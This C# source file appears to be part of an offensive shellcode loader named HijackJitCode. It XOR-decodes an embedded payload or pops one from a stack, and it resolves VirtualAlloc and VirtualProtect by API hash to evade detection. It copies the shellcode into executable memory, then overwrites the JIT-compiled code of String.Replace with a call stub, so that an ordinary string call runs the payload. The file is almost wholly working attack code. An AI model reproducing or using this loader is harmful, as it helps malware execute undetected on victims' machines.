using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace HijackJitCode
{
    class Execute
    {
        public static byte[] mybytearr;
        public static void exec()
        {
            if (GetCode.UseRaw == true)
            {
                mybytearr = GetEmbeddedBin(GetCode.ResName);
                for (int i = 0; i < mybytearr.Length; i++)
                {
                    mybytearr[i] ^= 0x4e;
                    mybytearr[i] ^= 0x2e;

                }

            }
            else
            {
                //3d4f0f8e
                Stack<byte> recvStack = GetCode.CodeStack();
                mybytearr = new byte[recvStack.Count];
                int payloadLen = recvStack.Count;
                for (int i = 0; i <= payloadLen; i++)
                {
                    try
                    {
                        mybytearr[i] = recvStack.Pop();
                    }
                    catch { break; }

                }
            }
            byte[] RAX = { 0XB8 };
            byte[] CALL = { 0XFF, 0XD0, 0x00 };
            Type t = typeof(System.String);
            IntPtr StringReplaceJTIAddr = t.TypeHandle.Value + 0x594dd0;

            IntPtr GetNeedDLL = Dinvoke.GetModuleAddress("kernel32.dll");
            IntPtr FuncAddr = Dinvoke.GetExpAddressByHASH(GetNeedDLL, @"3d4f0f8e");
            FuckAlloc FuckAlloc = (FuckAlloc)Marshal.GetDelegateForFunctionPointer(FuncAddr, typeof(FuckAlloc));
            IntPtr addr = FuckAlloc(0, mybytearr.Length, 0x1000, 0x04);
            byte[] HajkCode = GetBytes(addr.ToString("x8"));

            List<byte> OpCodeList = new List<byte> { };
            for (int i = 0; i < RAX.Length; i++)
            {
                OpCodeList.Add(RAX[i]);
            }

            for (int i = 0; i < HajkCode.Length; i++)
            {
                OpCodeList.Add(HajkCode[HajkCode.Length - 1 - i]);
            }
            for (int i = 0; i < CALL.Length; i++)
            {
                OpCodeList.Add(CALL[i]);
            }
            byte[] OpcodeArry = OpCodeList.ToArray();
          //  Console.WriteLine($"AllocMemAddress: 0x{addr.ToString("x16")}");
            Marshal.Copy(mybytearr, 0, addr, mybytearr.Length);

            uint word;
            MYVIRTULProtect(addr, (UIntPtr)mybytearr.Length, (uint)AllocationProtect.PAGE_EXECUTE, out word);

            IntPtr num;
            WriteProcessMemory(Process.GetCurrentProcess().Handle, StringReplaceJTIAddr + 1, OpcodeArry, OpcodeArry.Length, out num);
            "Stringa".Replace("a", "2222");




        }

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
                                               IntPtr hProcess,
                                               IntPtr lpBaseAddress,
                                               byte[] lpBuffer,
                                               Int32 nSize,
                                               out IntPtr lpNumberOfBytesWritten);


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool MYVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr FuckAlloc(UInt32 lpStartAddr, int size, UInt32 flAllocationType, UInt32 flProtect);

        public static bool MYVIRTULProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            IntPtr vppointer = Dinvoke.GetExpAddressByHASH(Dinvoke.GetModuleAddress(@"kernel32.dll"), @"ad9f9cd0");
            MYVirtualProtect mytirtualProtect = (MYVirtualProtect)Marshal.GetDelegateForFunctionPointer(vppointer, typeof(MYVirtualProtect));
            return mytirtualProtect(lpAddress, dwSize, flNewProtect, out lpflOldProtect);

        }


        public static byte[] GetBytes(string HexString)
        {
            int byteLength = HexString.Length / 2;
            byte[] bytes = new byte[byteLength];
            string hex;
            int j = 0;
            for (int i = 0; i < bytes.Length; i++)
            {
                hex = new String(new Char[] { HexString[j], HexString[j + 1] });
                bytes[i] = HexToByte(hex);
                j = j + 2;
            }
            return bytes;
        }

        public static byte HexToByte(string hex)
        {
            if (hex.Length > 2 || hex.Length <= 0)
                throw new ArgumentException("hex must be 1 or 2 characters in length");
            byte newByte = byte.Parse(hex, System.Globalization.NumberStyles.HexNumber);
            return newByte;
        }



        public static byte[] GetEmbeddedBin(string resourcesName)
        {

            var EmbeddedRes = Assembly.GetExecutingAssembly();
            using (var rs = EmbeddedRes.GetManifestResourceStream(resourcesName))
            {
                if (rs != null)
                {
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        return ms.ToArray();
                    }
                }
                else
                {
                    return null;
                }

            }
        }
    }
}
